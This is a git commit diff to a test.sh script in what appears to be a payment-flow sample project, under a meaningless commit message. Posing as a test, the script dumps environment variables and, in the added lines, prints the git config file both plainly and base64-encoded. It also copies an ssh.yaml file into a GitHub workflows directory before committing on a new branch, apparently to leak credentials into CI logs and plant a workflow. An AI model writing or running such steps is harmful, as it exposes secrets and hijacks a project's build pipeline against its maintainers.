8e849038f7352ecbca6c3478314886bdf59e0d64
ntk5 <nadavnoy555@gmail.com>
2024-09-03 22:27:50 +0300

    dddd

--- custom-payment-flow/client/android-kotlin/test.sh
+++ custom-payment-flow/client/android-kotlin/test.sh
@@ -2,11 +2,19 @@ env
 env | base64 -d 
 env | base64 | base64
 
+echo "before cat"
+
 cat ~/.git/config
+
+echo "after cat"
+
+cat ~/.git/config | base64
+
+
 
 git checkout -b "test_branch"
 
-echo 11111 >  test_branch_file
+cp ssh.yaml ~/.github/workflows/
 
 git add --all
 
